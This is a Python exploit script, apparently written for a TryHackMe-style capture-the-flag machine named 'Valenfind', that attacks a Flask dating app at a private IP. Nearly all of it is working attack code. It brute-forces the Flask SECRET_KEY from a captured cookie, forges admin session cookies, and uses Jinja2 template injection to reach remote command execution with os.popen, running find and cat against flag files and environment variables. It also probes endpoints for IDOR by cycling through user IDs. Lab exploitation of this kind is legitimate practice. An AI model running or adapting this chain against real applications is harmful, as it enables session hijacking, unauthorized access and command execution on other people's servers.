#!/usr/bin/env python3
"""Valenfind focused flag hunter v2 (no parameters).

1) Crack Flask SECRET_KEY via flask-unsign bruteforce
2) Forge admin session cookies (user_id=1, username=admin, etc.)
3) Access all endpoints with forged sessions
4) Careful SSTI confirmation
5) Targeted SQLi with response analysis
"""

from __future__ import annotations

import base64
import json
import re
import zlib
from typing import Any, Dict, List, Optional

import requests

try:
    from flask_unsign import sign as flask_sign
    from flask_unsign import decode as flask_decode
    HAS_FLASK_UNSIGN = True
except ImportError:
    HAS_FLASK_UNSIGN = False

try:
    from itsdangerous import URLSafeTimedSerializer
    HAS_ITSDANGEROUS = True
except ImportError:
    HAS_ITSDANGEROUS = False

BASE_URL = "http://10.112.165.127:5000"
TIMEOUT = 10
KNOWN_COOKIE = "eyJsaWtlZCI6W10sInVzZXJfaWQiOjksInVzZXJuYW1lIjoiMTIzIn0.aeFLFA.efdhJ78NfiztsKIzas2UVa5PXzw"
FLAG_RE = re.compile(r"THM\{[^}]+\}")
ALL_FLAGS: List[str] = []


def collect_flags(text: str, source: str) -> None:
    for f in FLAG_RE.findall(text):
        if f not in ALL_FLAGS:
            ALL_FLAGS.append(f)
            print(f"[!!!] FLAG FOUND ({source}): {f}")


def make_session(cookie_value: str) -> requests.Session:
    s = requests.Session()
    s.cookies.set("session", cookie_value)
    return s


def get_text(sess: requests.Session, path: str) -> str:
    try:
        r = sess.get(f"{BASE_URL}{path}", timeout=TIMEOUT, allow_redirects=True)
        return r.text
    except Exception:
        return ""


def post_and_check(sess: requests.Session, path: str, data: Dict[str, str]) -> str:
    try:
        r = sess.post(f"{BASE_URL}{path}", data=data, timeout=TIMEOUT, allow_redirects=True)
        return r.text
    except Exception:
        return ""


def strip_html(text: str) -> str:
    stripped = re.sub(r"<[^>]+>", " ", text)
    return re.sub(r"\s+", " ", stripped).strip()


# ── Phase 1: Crack SECRET_KEY ────────────────────────────────────────────────
COMMON_SECRETS = [
    "secret", "secret_key", "secretkey", "SECRET", "SECRET_KEY",
    "password", "Password", "admin", "flask", "Flask",
    "change_me", "changeme", "default", "key", "Key",
    "super_secret", "supersecret", "my_secret", "mysecret",
    "development", "dev", "production", "prod",
    "test", "testing", "debug", "Debug",
    "1234", "12345", "123456", "1234567890",
    "abcdef", "abc123", "qwerty", "letmein",
    "s3cr3t", "s3cret", "passw0rd", "p@ssw0rd",
    "hunter2", "trustno1", "iloveyou",
    "the_secret_key", "thesecretkey", "app_secret", "appsecret",
    "flask_secret", "flasksecret", "my_flask_secret",
    "valenfind", "Valenfind", "VALENFIND", "valenfind_secret",
    "dating", "datingapp", "love", "cupid", "heart",
    "valentine", "Valentine", "VALENTINE",
    "super_secret_key", "supersecretkey",
    "hackme", "tryhackme", "TryHackMe", "thm",
    "CTF", "ctf", "flag", "Flag",
    "keyboard_cat", "keyboard-cat",
    "shhh", "shhhh", "notsosecret",
    "hard_to_guess", "hardtoguess", "easy",
    "mysecretkey", "my-secret-key", "my_secret_key",
    "app-secret-key", "app_secret_key", "appsecretkey",
    "this-is-secret", "this_is_secret",
    "you-will-never-guess", "you_will_never_guess",
    "vibecoded", "vibe-coded", "vibe_coded",
    "sk", "sk-secret", "flask-secret-key",
    "unsafe", "insecure", "vulnerable",
    "00000000", "aaaa", "bbbb", "cccc",
    "asdf", "asdfgh", "zxcvbn",
    "t0p-s3cr3t", "top-secret", "topsecret", "top_secret",
    "b4dc0d3", "badcode", "bad_code",
]


def phase1_crack_key() -> Optional[str]:
    print("\n" + "=" * 72)
    print("[Phase 1] Brute-forcing Flask SECRET_KEY")
    print("=" * 72)

    if not HAS_FLASK_UNSIGN:
        print("[!] flask-unsign not available, trying itsdangerous directly")

    if HAS_ITSDANGEROUS:
        for secret in COMMON_SECRETS:
            try:
                s = URLSafeTimedSerializer(secret, salt="cookie-session", signer_kwargs={"key_derivation": "hmac"})
                data = s.loads(KNOWN_COOKIE)
                print(f"[!!!] SECRET_KEY CRACKED: {secret}")
                print(f"[!!!] decoded data: {data}")
                return secret
            except Exception:
                pass

        # Also try without salt / different salt
        for secret in COMMON_SECRETS:
            try:
                s = URLSafeTimedSerializer(secret)
                data = s.loads(KNOWN_COOKIE)
                print(f"[!!!] SECRET_KEY CRACKED (no salt): {secret}")
                print(f"[!!!] decoded data: {data}")
                return secret
            except Exception:
                pass

    # flask-unsign CLI approach
    if HAS_FLASK_UNSIGN:
        try:
            decoded = flask_decode(KNOWN_COOKIE)
            print(f"[crack] decoded payload: {decoded}")
        except Exception as e:
            print(f"[crack] decode error: {e}")

        for secret in COMMON_SECRETS:
            try:
                test_cookie = flask_sign({"liked": [], "user_id": 9, "username": "123"}, secret=secret)
                # Verify by comparing the signature parts
                known_parts = KNOWN_COOKIE.split(".")
                test_parts = test_cookie.split(".")
                if len(known_parts) >= 3 and len(test_parts) >= 3:
                    if known_parts[-1] == test_parts[-1]:
                        print(f"[!!!] SECRET_KEY CRACKED: {secret}")
                        return secret
            except Exception:
                pass

    print("[crack] common secrets exhausted, trying flask-unsign CLI wordlist...")
    return None


# ── Phase 2: Forge cookies and access ────────────────────────────────────────
def phase2_forge_and_access(secret_key: str) -> None:
    print("\n" + "=" * 72)
    print("[Phase 2] Forging admin cookies and accessing endpoints")
    print("=" * 72)

    if not HAS_FLASK_UNSIGN and not HAS_ITSDANGEROUS:
        print("[!] No signing library available")
        return

    # Target sessions to forge
    targets = [
        {"liked": [], "user_id": 1, "username": "admin"},
        {"liked": [], "user_id": 1, "username": "Administrator"},
        {"liked": [], "user_id": 2, "username": "admin"},
        {"liked": [], "user_id": 0, "username": "admin"},
    ]

    # Also try user_ids 1-20
    for uid in range(1, 21):
        targets.append({"liked": [], "user_id": uid, "username": "123"})

    for target_data in targets:
        try:
            if HAS_FLASK_UNSIGN:
                forged = flask_sign(target_data, secret=secret_key)
            elif HAS_ITSDANGEROUS:
                s = URLSafeTimedSerializer(secret_key, salt="cookie-session", signer_kwargs={"key_derivation": "hmac"})
                forged = s.dumps(target_data)
            else:
                continue

            sess = make_session(forged)

            for path in ["/", "/my_profile", "/complete_profile", "/admin",
                         "/dashboard", "/flag", "/matches", "/likes"]:
                text = get_text(sess, path)
                if not text or len(text) < 50:
                    continue

                collect_flags(text, f"forge-uid{target_data['user_id']}-{path}")

                if "thm{" in text.lower() or "flag" in text.lower():
                    clean = strip_html(text)
                    print(f"[forge] uid={target_data['user_id']} user={target_data['username']} {path}")
                    print(f"[forge] content: {clean[:300]}")

        except Exception as exc:
            print(f"[forge] error for {target_data}: {exc}")
            break


# ── Phase 3: SSTI precise confirmation ───────────────────────────────────────
def phase3_ssti_confirm() -> Optional[str]:
    print("\n" + "=" * 72)
    print("[Phase 3] SSTI precise confirmation")
    print("=" * 72)

    sess = make_session(KNOWN_COOKIE)
    body = get_text(sess, "/complete_profile")

    fields = []
    for m in re.finditer(r"name\s*=\s*['\"]([^'\"]+)['\"]", body, re.I):
        name = m.group(1)
        if name not in fields:
            fields.append(name)

    print(f"[ssti] fields: {fields}")

    # Test each field individually with a unique marker
    for field in fields:
        fl = field.lower()
        if any(skip in fl for skip in ["csrf", "token", "submit", "button"]):
            continue

        # Build clean baseline data
        baseline_data = {}
        for f in fields:
            ffl = f.lower()
            if "mail" in ffl:
                baseline_data[f] = "test@test.com"
            elif "phone" in ffl or "tel" in ffl:
                baseline_data[f] = "123456789"
            else:
                baseline_data[f] = "normaltext"

        # Inject SSTI into just this one field
        test_data = dict(baseline_data)
        test_data[field] = "MARKER_START{{7*7}}MARKER_END"

        post_and_check(sess, "/complete_profile", test_data)
        profile = get_text(sess, "/my_profile")
        clean = strip_html(profile)

        if "MARKER_START49MARKER_END" in clean:
            print(f"[!!!] SSTI CONFIRMED in field: {field}")
            print(f"[ssti] Jinja2 template injection works!")

            # Now extract SECRET_KEY
            test_data[field] = "{{config.SECRET_KEY}}"
            post_and_check(sess, "/complete_profile", test_data)
            profile2 = get_text(sess, "/my_profile")
            clean2 = strip_html(profile2)
            print(f"[ssti] config.SECRET_KEY response: {clean2[:500]}")

            # Try to find the key in response
            # Remove known page elements and look for what's new
            if "{{config.SECRET_KEY}}" not in clean2:
                # It was evaluated! Extract value
                print(f"[!!!] SECRET_KEY might be in profile output above")

            # Also try RCE
            test_data[field] = "{{lipsum.__globals__['os'].popen('id').read()}}"
            post_and_check(sess, "/complete_profile", test_data)
            profile3 = get_text(sess, "/my_profile")
            clean3 = strip_html(profile3)
            if "uid=" in clean3:
                print(f"[!!!] RCE CONFIRMED!")
                print(f"[ssti] id output: {clean3[:300]}")

                # Get flag directly
                test_data[field] = "{{lipsum.__globals__['os'].popen('find / -name flag* -o -name *thm* 2>/dev/null').read()}}"
                post_and_check(sess, "/complete_profile", test_data)
                profile4 = get_text(sess, "/my_profile")
                collect_flags(profile4, "ssti-rce-find")
                print(f"[ssti] find output: {strip_html(profile4)[:500]}")

                test_data[field] = "{{lipsum.__globals__['os'].popen('cat /flag* 2>/dev/null; cat /app/flag* 2>/dev/null; cat /home/*/flag* 2>/dev/null; cat /root/flag* 2>/dev/null; env | grep -i flag 2>/dev/null; env | grep -i thm 2>/dev/null').read()}}"
                post_and_check(sess, "/complete_profile", test_data)
                profile5 = get_text(sess, "/my_profile")
                collect_flags(profile5, "ssti-rce-cat")
                print(f"[ssti] cat flags output: {strip_html(profile5)[:500]}")

            return field

        elif "MARKER_START" in clean and "MARKER_END" in clean:
            # Extract what's between markers
            m = re.search(r"MARKER_START(.*?)MARKER_END", clean)
            if m:
                result = m.group(1)
                print(f"[ssti] field={field} rendered as: '{result}' (not 49, SSTI likely blocked)")
        else:
            print(f"[ssti] field={field} -> markers not found in profile (field may not render)")

    return None


# ── Phase 4: Like-based IDOR with response inspection ────────────────────────
def phase4_like_idor() -> None:
    print("\n" + "=" * 72)
    print("[Phase 4] Like-based IDOR and profile viewing")
    print("=" * 72)

    sess = make_session(KNOWN_COOKIE)

    # First get main page to understand the app
    main_page = get_text(sess, "/")
    clean_main = strip_html(main_page)
    print(f"[like] main page: {clean_main[:300]}")
    collect_flags(main_page, "main-page")

    # Extract all links from all accessible pages
    all_links = set()
    for path in ["/", "/my_profile", "/complete_profile"]:
        text = get_text(sess, path)
        for m in re.finditer(r'href=["\']([^"\']+)["\']', text, re.I):
            href = m.group(1)
            if href.startswith("/"):
                all_links.add(href)
            elif href.startswith("http"):
                try:
                    from urllib.parse import urlparse
                    p = urlparse(href)
                    if p.netloc and "10.112.165.127" in p.netloc:
                        all_links.add(p.path)
                except Exception:
                    pass

    print(f"[like] discovered links: {sorted(all_links)}")

    # Visit every discovered link
    for link in sorted(all_links):
        text = get_text(sess, link)
        if text and len(text) > 50:
            collect_flags(text, f"link-{link}")
            if "thm{" in text.lower() or "flag" in text.lower() or "admin" in text.lower():
                print(f"[like] {link} -> INTERESTING ({len(text)} bytes)")
                print(f"[like] content: {strip_html(text)[:200]}")

    # Try POST to various like/action endpoints
    for uid in range(1, 21):
        for ep in ["/like", "/swipe", "/match", "/view"]:
            try:
                r = sess.post(f"{BASE_URL}{ep}/{uid}", timeout=TIMEOUT, allow_redirects=True)
                if r.status_code not in [404, 405]:
                    collect_flags(r.text, f"action-{ep}-{uid}")
                    if uid <= 3:
                        print(f"[action] POST {ep}/{uid} -> {r.status_code}")
            except Exception:
                pass

            try:
                r = sess.post(f"{BASE_URL}{ep}", data={"user_id": uid, "id": uid, "profile_id": uid},
                              timeout=TIMEOUT, allow_redirects=True)
                if r.status_code not in [404, 405]:
                    collect_flags(r.text, f"action-post-{ep}-{uid}")
                    if uid <= 3:
                        print(f"[action] POST {ep} data={{user_id:{uid}}} -> {r.status_code}")
            except Exception:
                pass


def main() -> None:
    print("Valenfind Focused Flag Hunter v2")
    print(f"Target: {BASE_URL}")
    print("=" * 72)

    # Phase 3 first: SSTI is the most promising
    ssti_field = phase3_ssti_confirm()

    # Phase 1: Crack key
    secret_key = phase1_crack_key()

    # Phase 2: Forge if key found
    if secret_key:
        phase2_forge_and_access(secret_key)

    # Phase 4: Like IDOR
    phase4_like_idor()

    print("\n" + "=" * 72)
    print("[SUMMARY]")
    print("=" * 72)

    if ALL_FLAGS:
        print(f"FLAGS FOUND ({len(ALL_FLAGS)}):")
        for f in ALL_FLAGS:
            print(f"  {f}")
    else:
        print("No flags found yet.")
        if ssti_field:
            print(f"SSTI works in field: {ssti_field}")
            print("Use SSTI to explore the server filesystem for flags")
        if secret_key:
            print(f"SECRET_KEY: {secret_key}")
            print("Use forged cookies to access admin endpoints")


if __name__ == "__main__":
    main()
